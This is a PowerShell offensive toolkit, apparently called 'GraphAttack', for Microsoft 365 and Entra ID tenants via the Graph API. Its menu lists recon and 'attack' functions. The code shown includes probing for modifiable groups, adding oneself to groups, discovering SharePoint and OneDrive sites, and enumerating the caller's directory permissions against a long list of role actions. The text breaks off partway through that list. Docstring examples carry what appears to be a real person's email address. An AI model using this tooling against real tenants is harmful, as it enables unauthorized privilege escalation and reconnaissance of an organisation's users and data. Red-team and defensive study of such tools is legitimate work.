$ascii = @"

  ____                 _        _   _   _             _    
 / ___|_ __ __ _ _ __ | |__    / \ | |_| |_ __ _  ___| | __
| |  _| '__/ _` | '_ \| '_ \  / _ \| __| __/ _` |/ __| |/ /
| |_| | | | (_| | |_) | | | |/ ___ \ |_| || (_| | (__|   < 
 \____|_|  \__,_| .__/|_| |_/_/   \_\__|\__\__,_|\___|_|\_\
                |_|                                        

"@

Write-Host $ascii

Write-Host "================================================================================" -ForegroundColor Cyan
Write-Host " Usage Summary" -ForegroundColor Cyan
Write-Host "================================================================================" -ForegroundColor Cyan

Write-Host "`n[ Connection Functions ]" -ForegroundColor Cyan
Write-Host " Connect-Graph                - Install/Import essential modules & connect to Graph"

Write-Host "`n[ Enumeration Functions ]" -ForegroundColor Cyan
Write-Host " Get-UpdatableGroups          - Check which groups you can update (memberships), export CSV"
Write-Host " Get-SecurityGroups           - Retrieve security groups and their members, export CSV"
Write-Host " Get-DynamicGroups            - List dynamic membership groups and test access"
Write-Host " Get-AzureADUsers             - Retrieve all userPrincipalNames, save to a text file"
Write-Host " Get-PrivilegedUsers          - Enumerate users/groups/SPNs with privileged roles"
Write-Host " Get-MFAStatus                - Check MFA methods configured for all users"
Write-Host " Get-Devices                  - Enumerate registered devices & their owners, export CSV"
Write-Host " Get-TenantEnumeration        - Enumerate tenant config (domains, federation, external settings, etc.)"
Write-Host " Invoke-GraphRecon            - Gather tenant & user info, check your directory permissions"
Write-Host " Invoke-DumpCAPS              - Enumerate Conditional Access policies"
Write-Host " Invoke-DumpApps              - Enumerate App Registrations & Enterprise Apps"
Write-Host " Invoke-GraphEnum             - Comprehensive enumeration (Recon, Users, Groups, Email, SP/OD, etc.)"

Write-Host "`n[ Content Recon Functions ]" -ForegroundColor Cyan
Write-Host " Get-SharePointSiteURLs       - Discover SharePoint/OneDrive site URLs, optionally export CSV"
Write-Host " Invoke-SearchSharePointAndOneDrive - Search for files by keyword, optionally download"
Write-Host " Invoke-DriveFileDownload     - Download a single SharePoint/OneDrive file by driveItemID"
Write-Host " Invoke-SearchMailbox         - Search your mailbox by keyword, optionally export CSV"
Write-Host " Invoke-SearchTeamsMessages   - Search Teams channel messages for a keyword"
Write-Host " Invoke-SearchUserAttributes  - Search user attributes for a keyword"

Write-Host "`n[ Attack Functions ]" -ForegroundColor Cyan
Write-Host " Add-SelfToGroup             - Add your own user account to a specified group"
Write-Host " Remove-SelfFromGroup        - Remove your own account from a specified group"
Write-Host " Invoke-InviteGuest          - Invite an external (guest) user to the tenant"
Write-Host " Invoke-InjectOAuthApp       - Create an App Registration & grant OAuth permissions"
Write-Host " Invoke-SecurityGroupCloner  - Clone a security group and replicate its membership"

Write-Host "`nExample usage:" -ForegroundColor Cyan
Write-Host "    PS C:\\> Connect-Graph"
Write-Host "    PS C:\\> Get-UpdatableGroups -Output 'Updatable_Groups.csv'"
Write-Host ""

function Connect-Graph {
    <#
    .SYNOPSIS
        Imports all required Microsoft Graph submodules and connects to Microsoft Graph.
    .DESCRIPTION
        Ensures all required Microsoft Graph submodules are loaded for executing various API calls in your script.
        It connects to Microsoft Graph interactively without specifying scopes.
    .EXAMPLE
        Connect-Graph
    #>

    # Required Microsoft Graph Submodules
    $requiredModules = @(
        "Microsoft.Graph.Groups",                # For Get-MgGroup, New-MgGroupMember, Remove-MgGroupMemberByRef
        "Microsoft.Graph.Users",                 # For Get-MgUser
        "Microsoft.Graph.Applications",          # For Get-MgApplication, Get-MgServicePrincipal
        "Microsoft.Graph.Teams",                 # For Get-MgUserJoinedTeam, Get-MgTeamChannel, Get-MgTeamChannelMessage
        "Microsoft.Graph.Identity.DirectoryManagement"  # For Get-MgOrganization, roleManagement/directory/estimateAccess calls
    )

    Write-Host "[!] Installing and importing required modules..." -ForegroundColor Yellow

    # Check and install missing modules
    foreach ($module in $requiredModules) {
        if (-not (Get-Module -Name $module -ListAvailable)) {
            Write-Host "[!] Missing $module module. Installing..." -ForegroundColor Yellow
            try {
                Install-Module -Name $module -Scope CurrentUser -Force -ErrorAction Stop
            } catch {
                Write-Host "[-] Failed to install " + $module + ": " + $_.Exception.Message -ForegroundColor Red
            }
        }
    }

    # Import all required modules
    foreach ($module in $requiredModules) {
        Import-Module $module -ErrorAction SilentlyContinue
    }

    # Check if already connected
    if (-not (Get-MgContext)) {
        try {
            Write-Host "[*] Connecting to Microsoft Graph..." -ForegroundColor Cyan
            Connect-MgGraph
            Write-Host "[+] Successfully connected to Microsoft Graph!" -ForegroundColor Green
        } catch {
            Write-Host "[-] Failed to connect to Microsoft Graph: " + $_.Exception.Message -ForegroundColor Red
        }
    } else {
        Write-Host "[*] Already connected to Microsoft Graph." -ForegroundColor Cyan
    }
}


function Get-UpdatableGroups {
    <#
    .SYNOPSIS
        Finds groups that the current user can update (e.g., add/remove members) and exports detailed group properties to a CSV.

    .PARAMETER Output
        The path to export the updatable groups to a CSV file. Defaults to "updateable_groups.csv" if not specified.

    .EXAMPLE
        Get-UpdatableGroups -Output "Updatable_Groups_Detailed.csv"

    .EXAMPLE
        Get-UpdatableGroups
    #>

    param(
        [string]$Output = "updateable_groups.csv"
    )

    Write-Host "[*] Discovering groups you can update ..." -ForegroundColor Cyan
    
    # Connect to Graph if not already connected
    if (-not (Get-MgContext)) {
        Connect-Graph
    }

    $groups = Get-MgGroup -All
    $updatableGroups = @()

    foreach ($group in $groups) {
        $body = @{
            resourceActionAuthorizationChecks = @(
                @{
                    directoryScopeId = "/$($group.Id)"
                    resourceAction    = "microsoft.directory/groups/members/update"
                }
            )
        } | ConvertTo-Json -Depth 3

        try {
            $response = Invoke-MgGraphRequest -Method POST -Uri "https://graph.microsoft.com/beta/roleManagement/directory/estimateAccess" -Body $body -ContentType "application/json"

            if ($response.value.accessDecision -eq "allowed") {
                Write-Host "[+] You can update group: $($group.DisplayName) ($($group.Id))" -ForegroundColor Green
                $updatableGroups += $group
            }
        } catch {
            Write-Host "[-] Failed on group $($group.DisplayName): $_"
        }
    }

    if ($updatableGroups.Count -gt 0) {
        $updatableGroups | Export-Csv -Path $Output -NoTypeInformation
        Write-Host "[*] Exported updatable groups with detailed properties to $Output" -ForegroundColor Cyan
    } else {
        Write-Host "[-] No updatable groups found."
    }
}


function Add-SelfToGroup {
    <#
    .SYNOPSIS
        Adds the current user (by email) to a specified group.

    .PARAMETER GroupId
        The object ID of the group to add yourself to.

    .PARAMETER Email
        Your email address (UserPrincipalName) to find your user ID.

    .EXAMPLE
        Add-SelfToGroup -GroupId "e6a413c2-2aa4-4a80-9c16-88c1687f57d9" -Email "bradley.goodwin@infotrust.com.au"
    #>

    param(
        [Parameter(Mandatory = $true)]
        [string]$GroupId,

        [Parameter(Mandatory = $true)]
        [string]$Email
    )

    # Connect to Graph if not already connected
    if (-not (Get-MgContext)) {
        Connect-Graph
    }

    # Get the user's ID from their email
    try {
        $user = Get-MgUser -UserId $Email
        $userId = $user.Id
        Write-Host "[*] Found User ID: $userId for $Email"
    } catch {
        Write-Host "[-] Failed to find user with email $Email : $($_.Exception.Message)"
        return
    }

    # Add the user to the group
    try {
        New-MgGroupMember -GroupId $GroupId -DirectoryObjectId $userId
        Write-Host "[+] Successfully added $Email to Group ID: $GroupId"
    } catch {
        Write-Host "[-] Failed to add member to group: $($_.Exception.Message)"
    }
}


function Remove-SelfFromGroup {
    <#
    .SYNOPSIS
        Removes the current user (by email) from a specified group.

    .PARAMETER GroupId
        The object ID of the group to remove yourself from.

    .PARAMETER Email
        Your email address (UserPrincipalName) to find your user ID.

    .EXAMPLE
        Remove-SelfFromGroup -GroupId "e6a413c2-2aa4-4a80-9c16-88c1687f57d9" -Email "bradley.goodwin@infotrust.com.au"
    #>

    param(
        [Parameter(Mandatory = $true)]
        [string]$GroupId,

        [Parameter(Mandatory = $true)]
        [string]$Email
    )

    # Connect to Graph if not already connected
    if (-not (Get-MgContext)) {
        Connect-Graph
    }

    # Get User ID based on email
    try {
        $user = Get-MgUser -UserId $Email
        $userId = $user.Id
        Write-Host "[*] Found User ID: $userId for $Email"
    } catch {
        Write-Host "[-] Failed to find user with email $Email : $($_.Exception.Message)"
        return
    }

    # Remove the user from the group
    try {
        Remove-MgGroupMemberByRef -GroupId $GroupId -DirectoryObjectId $userId -ErrorAction Stop
        Write-Host "[+] Successfully removed $Email from Group ID: $GroupId"
    } catch {
        Write-Host "[-] Failed to remove member from group: $($_.Exception.Message)"
    }
}

function Get-SharePointSiteURLs {
    <#
    .SYNOPSIS
        Uses the Graph Search API to find SharePoint site URLs.

    .PARAMETER Output
        Optional. Path to export the discovered SharePoint site URLs to a CSV file.

    .EXAMPLE
        Get-SharePointSiteURLs
        Get-SharePointSiteURLs -Output "SharePointSites.csv"
    #>

    param(
        [string]$Output
    )

    # Connect to Graph if not already connected
    if (-not (Get-MgContext)) {
        Connect-Graph
    }

    # Search API request URL
    $searchUrl = "https://graph.microsoft.com/v1.0/search/query"

    # Request body for SharePoint site discovery
    $requestBody = @{
        requests = @(
            @{
                entityTypes = @("drive")
                query       = @{ queryString = "*" }
                from        = 0
                size        = 500
                fields      = @("parentReference", "webUrl")
            }
        )
    } | ConvertTo-Json -Depth 10 -Compress

    Write-Host "[*] Querying SharePoint Sites using Graph Search API..."

    try {
        $response = Invoke-MgGraphRequest -Method POST -Uri $searchUrl -Body $requestBody -ContentType "application/json"
        $hitsContainers = $response.value.hitsContainers
    } catch {
        Write-Host "[-] Failed to query SharePoint sites: $($_.Exception.Message)"
        return
    }

    # Collect unique sites based on siteId
    $seenSiteIds = @{}
    $siteResults = @()

    foreach ($container in $hitsContainers.hits) {
        $siteId = $container.resource.parentReference.siteId
        $webUrl = $container.resource.webUrl

        if (-not $seenSiteIds.ContainsKey($siteId)) {
            $seenSiteIds[$siteId] = $true
            $siteResults += [PSCustomObject]@{
                SiteId = $siteId
                WebUrl = $webUrl
            }
        }
    }

    $siteResults = $siteResults | Sort-Object WebUrl

    if ($siteResults.Count -gt 0) {
        Write-Host "[+] Found $($siteResults.Count) unique SharePoint site URLs:"
        $siteResults | Format-Table SiteId, WebUrl

        if ($Output) {
            $siteResults | Export-Csv -Path $Output -NoTypeInformation
            Write-Host "[*] Exported to $Output"
        }
    } else {
        Write-Host "[-] No SharePoint site URLs found."
    }
}

function Invoke-GraphRecon {

    Write-Host "[*] Gathering Organisation and User Information..."

    $org = Get-MgOrganization

    try {
        $userEmail = (Get-MgContext).Account
        $me = Get-MgUser -UserId $userEmail
        $userId = $me.Id
    } catch {
        Write-Host "[-] Failed to retrieve current user info: $($_.Exception.Message)"
        return
    }

    Write-Host "`n[*] Organisation Details:"
    $org | Select-Object DisplayName, VerifiedDomains, TenantId | Format-List

    Write-Host "`n[*] Current User Details:"
    $me | Select-Object DisplayName, UserPrincipalName, Id | Format-List

    try {
        $authPolicy = Invoke-MgGraphRequest -Method GET -Uri "https://graph.microsoft.com/beta/policies/authorizationPolicy"
        $defaultPermissions = $authPolicy.value.defaultUserRolePermissions
        Write-Host "`n[*] Default User Role Permissions:"
        $defaultPermissions | Format-List
    } catch {
        Write-Host "[-] Failed to retrieve Authorisation Policy: $($_.Exception.Message)"
    }

    Write-Host "`n[*] Enumerating Directory Permissions (EstimateAccess)..."

    $estimateAccessUri = "https://graph.microsoft.com/beta/roleManagement/directory/estimateAccess"

    $resourceActions = @{
        "microsoft.directory/adminConsentRequestPolicy/allProperties/allTasks" = "Manage admin consent request policies in Microsoft Entra ID"
        "microsoft.directory/appConsent/appConsentRequests/allProperties/read" = "Read all properties of consent requests for applications registered with Microsoft Entra ID"
        "microsoft.directory/applications/create" = "Create all types of applications"
        "microsoft.directory/applications/createAsOwner" = "Create all types of applications, and creator is added as the first owner"
        "microsoft.directory/oAuth2PermissionGrants/createAsOwner" = "Create OAuth 2.0 permission grants, with creator as the first owner"
        "microsoft.directory/servicePrincipals/createAsOwner" = "Create service principals, with creator as the first owner"
        "microsoft.directory/applications/delete" = "Delete all types of applications"
        "microsoft.directory/applications/applicationProxy/read" = "Read all application proxy properties"
        "microsoft.directory/applications/applicationProxy/update" = "Update all application proxy properties"
        "microsoft.directory/applications/applicationProxyAuthentication/update" = "Update authentication on all types of applications"
        "microsoft.directory/applications/applicationProxySslCertificate/update" = "Update SSL certificate settings for application proxy"
        "microsoft.directory/applications/applicationProxyUrlSettings/update" = "Update URL settings for application proxy"
        "microsoft.directory/applications/appRoles/update" = "Update the appRoles property on all types of applications"
        "microsoft.directory/applications/audience/update" = "Update the audience property for applications"
        "microsoft.directory/applications/authentication/update" = "Update authentication on all types of applications"
        "microsoft.directory/applications/basic/update" = "Update basic properties for applications"
        "microsoft.directory/applications/credentials/update" = "Update application credentials"
        "microsoft.directory/applications/extensionProperties/update" = "Update extension properties on applications"
        "microsoft.directory/applications/notes/update" = "Update notes of applications"
        "microsoft.directory/applications/owners/update" = "Update owners of applications"
        "microsoft.directory/applications/permissions/update" = "Update exposed permissions and required permissions on all types of applications"
        "microsoft.directory/applications/policies/update" = "Update policies of applications"
        "microsoft.directory/applications/tag/update" = "Update tags of applications"
        "microsoft.directory/applications/verification/update" = "Update applications verification property"
        "microsoft.directory/applications/synchronization/standard/read" = "Read provisioning settings associated with the application object"
        "microsoft.directory/applicationTemplates/instantiate" = "Instantiate gallery applications from application templates"
        "microsoft.directory/auditLogs/allProperties/read" = "Read all properties on audit logs, excluding custom security attributes audit logs"
        "microsoft.directory/connectors/create" = "Create application proxy connectors"
        "microsoft.directory/connectors/allProperties/read" = "Read all properties of application proxy connectors"
        "microsoft.directory/connectorGroups/create" = "Create application proxy connector groups"
        "microsoft.directory/connectorGroups/delete" = "Delete application proxy connector groups"
        "microsoft.directory/connectorGroups/allProperties/read" = "Read all properties of application proxy connector groups"
        "microsoft.directory/connectorGroups/allProperties/update" = "Update all properties of application proxy connector groups"
        "microsoft.directory/customAuthenticationExtensions/allProperties/allTasks" = "Create and manage custom authentication extensions"
        "microsoft.directory/deletedItems.applications/delete" = "Permanently delete applications, which can no longer be restored"
        "microsoft.directory/deletedItems.applications/restore" = "Restore soft deleted applications to original state"
        "microsoft.directory/oAuth2PermissionGrants/allProperties/allTasks" = "Create and delete OAuth 2.0 permission grants, and read and update all properties"
        "microsoft.directory/applicationPolicies/create" = "Create application policies"
        "microsoft.directory/applicationPolicies/delete" = "Delete application policies"
        "microsoft.directory/applicationPolicies/standard/read" = "Read standard properties of application policies"
        "microsoft.directory/applicationPolicies/owners/read" = "Read owners on application policies"
        "microsoft.directory/applicationPolicies/policyAppliedTo/read" = "Read application policies applied to objects list"
        "microsoft.directory/applicationPolicies/basic/update" = "Update standard properties of application policies"
        "microsoft.directory/applicationPolicies/owners/update" = "Update the owner property of application policies"
        "microsoft.directory/provisioningLogs/allProperties/read" = "Read all properties of provisioning logs"
        "microsoft.directory/servicePrincipals/create" = "Create service principals"
        "microsoft.directory/servicePrincipals/delete" = "Delete service principals"
        "microsoft.directory/servicePrincipals/disable" = "Disable service principals"
        "microsoft.directory/servicePrincipals/enable" = "Enable service principals"
        "microsoft.directory/servicePrincipals/getPasswordSingleSignOnCredentials" = "Manage password single sign-on credentials on service principals"
        "microsoft.directory/servicePrincipals/synchronizationCredentials/manage" = "Manage application provisioning secrets and credentials"
        "microsoft.directory/servicePrincipals/synchronizationJobs/manage" = "Start, restart, and pause application provisioning synchronization jobs"
        "microsoft.directory/servicePrincipals/synchronizationSchema/manage" = "Create and manage application provisioning synchronization jobs and schema"
        "microsoft.directory/servicePrincipals/managePasswordSingleSignOnCredentials" = "Read password single sign-on credentials on service principals"
        "microsoft.directory/servicePrincipals/managePermissionGrantsForAll.microsoft-application-admin" = "Grant consent for application permissions and delegated permissions on behalf of any user or all users, except for application permissions for Microsoft Graph"
        "microsoft.directory/servicePrincipals/appRoleAssignedTo/update" = "Update service principal role assignments"
        "microsoft.directory/servicePrincipals/audience/update" = "Update audience properties on service principals"
        "microsoft.directory/servicePrincipals/authentication/update" = "Update authentication properties on service principals"
        "microsoft.directory/servicePrincipals/basic/update" = "Update basic properties on service principals"
        "microsoft.directory/servicePrincipals/credentials/update" = "Update credentials of service principals"
        "microsoft.directory/servicePrincipals/notes/update" = "Update notes of service principals"
        "microsoft.directory/servicePrincipals/owners/update" = "Update owners of service principals"
        "microsoft.directory/servicePrincipals/permissions/update" = "Update permissions of service principals"
        "microsoft.directory/servicePrincipals/policies/update" = "Update policies of service principals"
        "microsoft.directory/servicePrincipals/tag/update" = "Update the tag property for service principals"
        "microsoft.directory/servicePrincipals/synchronization/standard/read" = "Read provisioning settings associated with your service principal"
        "microsoft.directory/signInReports/allProperties/read" = "Read all properties on sign-in reports, including privileged properties"
        "microsoft.azure.serviceHealth/allEntities/allTasks" = "Read and configure Azure Service Health"
        "microsoft.azure.supportTickets/allEntities/allTasks" = "Create and manage Azure support tickets"
        "microsoft.office365.serviceHealth/allEntities/allTasks" = "Read and configure Service Health in the Microsoft 365 admin center"
        "microsoft.office365.supportTickets/allEntities/allTasks" = "Create and manage Microsoft 365 service requests"
        "microsoft.office365.webPortal/allEntities/standard/read" = "Read basic properties on all resources in the Microsoft 365 admin center"
        "microsoft.directory/administrativeUnits/standard/read" = "Read basic properties on administrative units"
        "microsoft.directory/administrativeUnits/members/read" = "Read members of administrative units"
        "microsoft.directory/applications/standard/read" = "Read standard properties of applications"
        "microsoft.directory/applications/owners/read" = "Read owners of applications"
        "microsoft.directory/applications/policies/read" = "Read policies of applications"
        "microsoft.directory/contacts/standard/read" = "Read basic properties on contacts in Microsoft Entra ID"
        "microsoft.directory/contacts/memberOf/read" = "Read the group membership for all contacts in Microsoft Entra ID"
        "microsoft.directory/contracts/standard/read" = "Read basic properties on partner contracts"
        "microsoft.directory/devices/standard/read" = "Read basic properties on devices"
        "microsoft.directory/devices/memberOf/read" = "Read device memberships"
        "microsoft.directory/devices/registeredOwners/read" = "Read registered owners of devices"
        "microsoft.directory/devices/registeredUsers/read" = "Read registered users of devices"
        "microsoft.directory/directoryRoles/standard/read" = "Read basic properties in Microsoft Entra roles"
        "microsoft.directory/directoryRoles/eligibleMembers/read" = "Read the eligible members of Microsoft Entra roles"
        "microsoft.directory/directoryRoles/members/read" = "Read all members of Microsoft Entra roles"
        "microsoft.directory/domains/standard/read" = "Read basic properties on domains"
        "microsoft.directory/groups/standard/read" = "Read standard properties of Security groups and Microsoft 365 groups, including role-assignable groups"
        "microsoft.directory/groups/appRoleAssignments/read" = "Read application role assignments of groups"
        "microsoft.directory/groups/memberOf/read" = "Read the memberOf property on Security groups and Microsoft 365 groups, including role-assignable groups"
        "microsoft.directory/groups/members/read" = "Read members of Security groups and Microsoft 365 groups, including role-assignable groups"
        "microsoft.directory/groups/owners/read" = "Read owners of Security groups and Microsoft 365 groups, including role-assignable groups"
        "microsoft.directory/groups/settings/read" = "Read settings of groups"
        "microsoft.directory/groupSettings/standard/read" = "Read basic properties on group settings"
        "microsoft.directory/groupSettingTemplates/standard/read" = "Read basic properties on group setting templates"
        "microsoft.directory/oAuth2PermissionGrants/standard/read" = "Read basic properties on OAuth 2.0 permission grants"
        "microsoft.directory/organization/standard/read" = "Read basic properties on an organization"
        "microsoft.directory/organization/trustedCAsForPasswordlessAuth/read" = "Read trusted certificate authorities for passwordless authentication"
        "microsoft.directory/roleAssignments/standard/read" = "Read basic properties on role assignments"
        "microsoft.directory/roleDefinitions/standard/read" = "Read basic properties on role definitions"
        "microsoft.directory/servicePrincipals/appRoleAssignedTo/read" = "Read service principal role assignments"
        "microsoft.directory/servicePrincipals/appRoleAssignments/read" = "Read role assignments assigned to service principals"
        "microsoft.directory/servicePrincipals/standard/read" = "Read basic properties of service principals"
        "microsoft.directory/servicePrincipals/memberOf/read" = "Read the group memberships on service principals"
        "microsoft.directory/servicePrincipals/oAuth2PermissionGrants/read" = "Read delegated permission grants on service principals"
        "microsoft.directory/servicePrincipals/owners/read" = "Read owners of service principals"
        "microsoft.directory/servicePrincipals/ownedObjects/read" = "Read owned objects of service principals"
        "microsoft.directory/servicePrincipals/policies/read" = "Read policies of service principals"
        "microsoft.directory/subscribedSkus/standard/read" = "Read basic properties on subscriptions"
        "microsoft.directory/users/standard/read" = "Read basic properties on users"
        "microsoft.directory/users/appRoleAssignments/read" = "Read application role assignments for users"
        "microsoft.directory/users/deviceForResourceAccount/read" = "Read deviceForResourceAccount of users"
        "microsoft.directory/users/directReports/read" = "Read the direct reports for users"
        "microsoft.directory/users/licenseDetails/read" = "Read license details of users"
        "microsoft.directory/users/manager/read" = "Read manager of users"
        "microsoft.directory/users/memberOf/read" = "Read the group memberships of users"
        "microsoft.directory/users/oAuth2PermissionGrants/read" = "Read delegated permission grants on users"
        "microsoft.directory/users/ownedDevices/read" = "Read owned devices of users"
        "microsoft.directory/users/ownedObjects/read" = "Read owned objects of users"
        "microsoft.directory/users/photo/read" = "Read photo of users"
        "microsoft.directory/users/registeredDevices/read" = "Read registered devices of users"
        "microsoft.directory/users/scopedRoleMemberOf/read" = "Read user's membership of a Microsoft Entra role, that is scoped to an administrative unit"
        "microsoft.directory/users/sponsors/read" = "Read sponsors of users"
        "microsoft.directory/authorizationPolicy/allProperties/allTasks" = "Manage all aspects of authorization policy"
        "microsoft.directory/users/inviteGuest" = "Invite Guest Users"
        "microsoft.directory/deletedItems.devices/delete" = "Permanently delete devices, which can no longer be restored"
        "microsoft.directory/deletedItems.devices/restore" = "Restore soft deleted devices to the original state"
        "microsoft.directory/devices/create" = "Create devices (enroll in Microsoft Entra ID)"
        "microsoft.directory/devices/delete" = "Delete devices from Microsoft Entra ID"
        "microsoft.directory/devices/disable" = "Disable devices in Microsoft Entra ID"
        "microsoft.directory/devices/enable" = "Enable devices in Microsoft Entra ID"
        "microsoft.directory/devices/basic/update" = "Update basic properties on devices"
        "microsoft.directory/devices/extensionAttributeSet1/update" = "Update the extensionAttribute1 to extensionAttribute5 properties on devices"
        "microsoft.directory/devices/extensionAttributeSet2/update" = "Update the extensionAttribute6 to extensionAttribute10 properties on devices"
        "microsoft.directory/devices/extensionAttributeSet3/update" = "Update the extensionAttribute11 to extensionAttribute15 properties on devices"
        "microsoft.directory/devices/registeredOwners/update" = "Update registered owners of devices"
        "microsoft.directory/devices/registeredUsers/update" = "Update registered users of devices"
        "microsoft.directory/groups.security/create" = "Create Security groups, excluding role-assignable groups"
        "microsoft.directory/groups.security/delete" = "Delete Security groups, excluding role-assignable groups"
        "microsoft.directory/groups.security/basic/update" = "Update basic properties on Security groups, excluding role-assignable groups"
        "microsoft.directory/groups.security/classification/update" = "Update the classification property on Security groups, excluding role-assignable groups"
        "microsoft.directory/groups.security/dynamicMembershipRule/update" = "Update the dynamic membership rule on Security groups, excluding role-assignable groups"
        "microsoft.directory/groups.security/members/update" = "Update members of Security groups, excluding role-assignable groups"
        "microsoft.directory/groups.security/owners/update" = "Update owners of Security groups, excluding role-assignable groups"
        "microsoft.directory/groups.security/visibility/update" = "Update the visibility property on Security groups, excluding role-assignable groups"
        "microsoft.directory/deviceManagementPolicies/standard/read" = "Read standard properties on device management application policies"
        "microsoft.directory/deviceRegistrationPolicy/standard/read" = "Read standard properties on device registration policies"
        "microsoft.cloudPC/allEntities/allProperties/allTasks" = "Manage all aspects of Windows 365"
        "microsoft.office365.usageReports/allEntities/allProperties/read" = "Read Office 365 usage reports"
        "microsoft.directory/authorizationPolicy/standard/read" = "Read standard properties of authorization policy"
        "microsoft.directory/hybridAuthenticationPolicy/allProperties/allTasks" = "Manage hybrid authentication policy in Microsoft Entra ID"
        "microsoft.directory/organization/dirSync/update" = "Update the organization directory sync property"
        "microsoft.directory/passwordHashSync/allProperties/allTasks" = "Manage all aspects of Password Hash Synchronization (PHS) in Microsoft Entra ID"
        "microsoft.directory/policies/create" = "Create policies in Microsoft Entra ID"
        "microsoft.directory/policies/delete" = "Delete policies in Microsoft Entra ID"
        "microsoft.directory/policies/standard/read" = "Read basic properties on policies"
        "microsoft.directory/policies/owners/read" = "Read owners of policies"
        "microsoft.directory/policies/policyAppliedTo/read" = "Read policies.policyAppliedTo property"
        "microsoft.directory/policies/basic/update" = "Update basic properties on policies"
        "microsoft.directory/policies/owners/update" = "Update owners of policies"
        "microsoft.directory/policies/tenantDefault/update" = "Update default organization policies"
        "microsoft.directory/contacts/create" = "Create contacts"
        "microsoft.directory/groups/assignLicense" = "Assign product licenses to groups for group-based licensing"
        "microsoft.directory/groups/create" = "Create Security groups and Microsoft 365 groups, excluding role-assignable groups"
        "microsoft.directory/groups/reprocessLicenseAssignment" = "Reprocess license assignments for group-based licensing"
        "microsoft.directory/groups/basic/update" = "Update basic properties on Security groups and Microsoft 365 groups, excluding role-assignable groups"
        "microsoft.directory/groups/classification/update" = "Update the classification property on Security groups and Microsoft 365 groups, excluding role-assignable groups"
        "microsoft.directory/groups/dynamicMembershipRule/update" = "Update the dynamic membership rule on Security groups and Microsoft 365 groups, excluding role-assignable groups"
        "microsoft.directory/groups/groupType/update" = "Update properties that would affect the group type of Security groups and Microsoft 365 groups, excluding role-assignable groups"
        "microsoft.directory/groups/members/update" = "Update members of Security groups and Microsoft 365 groups, excluding role-assignable groups"
        "microsoft.directory/groups/onPremWriteBack/update" = "Update Microsoft Entra groups to be written back to on-premises with Microsoft Entra Connect"
        "microsoft.directory/groups/owners/update" = "Update owners of Security groups and Microsoft 365 groups, excluding role-assignable groups"
        "microsoft.directory/groups/settings/update" = "Update settings of groups"
        "microsoft.directory/groups/visibility/update" = "Update the visibility property of Security groups and Microsoft 365 groups, excluding role-assignable groups"
        "microsoft.directory/groupSettings/create" = "Create group settings"
        "microsoft.directory/groupSettings/delete" = "Delete group settings"
        "microsoft.directory/groupSettings/basic/update" = "Update basic properties on group settings"
        "microsoft.directory/oAuth2PermissionGrants/create" = "Create OAuth 2.0 permission grants"
        "microsoft.directory/oAuth2PermissionGrants/basic/update" = "Update OAuth 2.0 permission grants"
        "microsoft.directory/users/assignLicense" = "Manage user licenses"
        "microsoft.directory/users/create" = "Add users"
        "microsoft.directory/users/disable" = "Disable users"
        "microsoft.directory/users/enable" = "Enable users"
        "microsoft.directory/users/invalidateAllRefreshTokens" = "Force sign-out by invalidating user refresh tokens"
        "microsoft.directory/users/reprocessLicenseAssignment" = "Reprocess license assignments for users"
        "microsoft.directory/users/basic/update" = "Update basic properties on users"
        "microsoft.directory/users/manager/update" = "Update manager for users"
        "microsoft.directory/users/photo/update" = "Update photo of users"
        "microsoft.directory/users/sponsors/update" = "Update sponsors of users"
        "microsoft.directory/users/userPrincipalName/update" = "Update User Principal Name of users"
        "microsoft.directory/domains/allProperties/allTasks" = "Create and delete domains, and read and update all properties"
        "microsoft.directory/b2cUserFlow/allProperties/allTasks" = "Read and configure user flow in Azure Active Directory B2C"
        "microsoft.directory/b2cUserAttribute/allProperties/allTasks" = "Read and configure user attribute in Azure Active Directory B2C"
        "microsoft.directory/groups/hiddenMembers/read" = "Read hidden members of Security groups and Microsoft 365 groups, including role-assignable groups"
        "microsoft.directory/groups.unified/create" = "Create Microsoft 365 groups, excluding role-assignable groups"
        "microsoft.directory/groups.unified/delete" = "Delete Microsoft 365 groups, excluding role-assignable groups"
        "microsoft.directory/groups.unified/restore" = "Restore Microsoft 365 groups from soft-deleted container, excluding role-assignable groups"
        "microsoft.directory/groups.unified/basic/update" = "Update basic properties on Microsoft 365 groups, excluding role-assignable groups"
        "microsoft.directory/groups.unified/members/update" = "Update members of Microsoft 365 groups, excluding role-assignable groups"
        "microsoft.directory/groups.unified/owners/update" = "Update owners of Microsoft 365 groups, excluding role-assignable groups"
        "microsoft.office365.exchange/allEntities/basic/allTasks" = "Manage all aspects of Exchange Online"
        "microsoft.office365.network/performance/allProperties/read" = "Read all network performance properties in the Microsoft 365 admin center"
        "microsoft.directory/accessReviews/allProperties/allTasks" = "(Deprecated) Create and delete access reviews, read and update all properties of access reviews, and manage access reviews of groups in Microsoft Entra ID"
        "microsoft.directory/accessReviews/definitions/allProperties/allTasks" = "Manage access reviews of all reviewable resources in Microsoft Entra ID"
        "microsoft.directory/administrativeUnits/allProperties/allTasks" = "Create and manage administrative units (including members)"
        "microsoft.directory/applications/allProperties/allTasks" = "Create and delete applications, and read and update all properties"
        "microsoft.directory/users/authenticationMethods/create" = "Update authentication methods for users"
        "microsoft.directory/users/authenticationMethods/delete" = "Delete authentication methods for users"
        "microsoft.directory/users/authenticationMethods/standard/read" = "Read standard properties of authentication methods for users"
        "microsoft.directory/users/authenticationMethods/basic/update" = "Update basic properties of authentication methods for users"
        "microsoft.directory/bitlockerKeys/key/read" = "Read bitlocker metadata and key on devices"
        "microsoft.directory/cloudAppSecurity/allProperties/allTasks" = "Create and delete all resources, and read and update standard properties in Microsoft Defender for Cloud Apps"
        "microsoft.directory/contacts/allProperties/allTasks" = "Create and delete contacts, and read and update all properties"
        "microsoft.directory/contracts/allProperties/allTasks" = "Create and delete partner contracts, and read and update all properties"
        "microsoft.directory/deletedItems/delete" = "Permanently delete objects, which can no longer be restored"
        "microsoft.directory/deletedItems/restore" = "Restore soft deleted objects to original state"
        "microsoft.directory/devices/allProperties/allTasks" = "Create and delete devices, and read and update all properties"
        "microsoft.directory/namedLocations/create" = "Create custom rules that define network locations"
        "microsoft.directory/namedLocations/delete" = "Delete custom rules that define network locations"
        "microsoft.directory/namedLocations/standard/read" = "Read basic properties of custom rules that define network locations"
        "microsoft.directory/namedLocations/basic/update" = "Update basic properties of custom rules that define network locations"
        "microsoft.directory/deviceLocalCredentials/password/read" = "Read all properties of the backed up local administrator account credentials for Microsoft Entra joined devices, including the password"
        "microsoft.directory/deviceManagementPolicies/basic/update" = "Update basic properties on device management application policies"
        "microsoft.directory/deviceRegistrationPolicy/basic/update" = "Update basic properties on device registration policies"
